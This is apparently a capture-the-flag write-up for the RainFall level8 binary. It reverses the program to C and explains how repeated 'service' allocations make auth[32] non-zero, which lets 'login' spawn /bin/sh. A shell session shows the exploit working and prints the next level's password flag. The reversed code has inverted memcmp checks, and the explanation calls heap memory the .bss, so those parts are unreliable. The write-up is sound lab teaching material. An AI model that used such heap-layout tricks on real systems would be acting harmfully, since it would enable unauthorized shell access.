# Solution

Here is the binary reverse C code

```c
char    *auth = NULL;
char    *service = NULL;

int main(void) 
{
    char    buffer[128];
    while (1)
    {
        printf("%p, %p \n", (void *)auth, (void *)service);
        if (fgets(buffer, 128, stdin) == 0)
            break;

        if (memcmp(buffer, "auth ", 5))
        {
            auth = malloc(4);
            auth[0] = 0;
            if (strlen(buffer + 5) <= 30)
                strcpy(auth, buffer + 5);
        }
        if (memcmp(buffer, "reset", 5))
            free(auth);
        if (memcmp(buffer, "service", 6))
            service = strdup(buffer + 7);
        if (memcmp(buffer, "login", 5))
        {
            if (auth[32])
                system("/bin/sh");
            else
                fwrite("Password:\n", 10, 1, stdout);
        }
    }
    return (0);
}
```

Here the objectif will be to access to the call of `system("/bin/sh")` that is only accessible if `auth[32]` is not NULL.

So how can we do that if we take a close look to the other function use we see that we have a `fgets` call,
but this will not allow us to overflow also `auth` is in the .bss (is a global variable) meaning that we cannot,
overflow on this value unless we find a overflow on the .bss.

That's where `service` is really handy because `service` is in the .bss so, we need to overflow with `service` to hit,
`auth[32]` but if we pay attention to all the function that service is using is `strdup`, this will not allow us to overflow,
but since we are inside an infinite loop we can call multiple time the same value espacially we can call `strdup` which call `malloc`,
so we bascally can increase the size of the bss address of service which will allow us to hit `auth[32]` so it will have a value to pass the if statement.


```sh
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
service
0x804a008, 0x804a038
login
$
```

So we have a shell but what happend, basically we increase the address of the bss by just calling multiple time the service option,  
we need to hit 32 byte higher before calling login option (first address is auth, second address is service) once we have 32 byte higher address,
the `auth[32]` is one set and has a positive value which will allow us to pass the if statement.


Here is the flag

```sh
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
